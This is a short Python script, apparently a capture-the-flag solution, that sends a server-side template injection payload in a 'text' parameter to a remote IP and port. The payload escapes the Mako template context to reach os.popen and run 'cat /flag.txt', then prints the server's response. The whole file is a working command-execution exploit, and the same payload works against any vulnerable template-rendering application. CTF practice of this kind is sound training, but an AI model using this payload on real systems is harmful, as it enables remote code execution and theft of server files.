import requests

url = "http://134.122.106.203:30356"

res = requests.get(url, params={
    "text": "${self.module.cache.util.os.popen('cat /flag.txt').read()}"
})

print(res.text[:-6100])
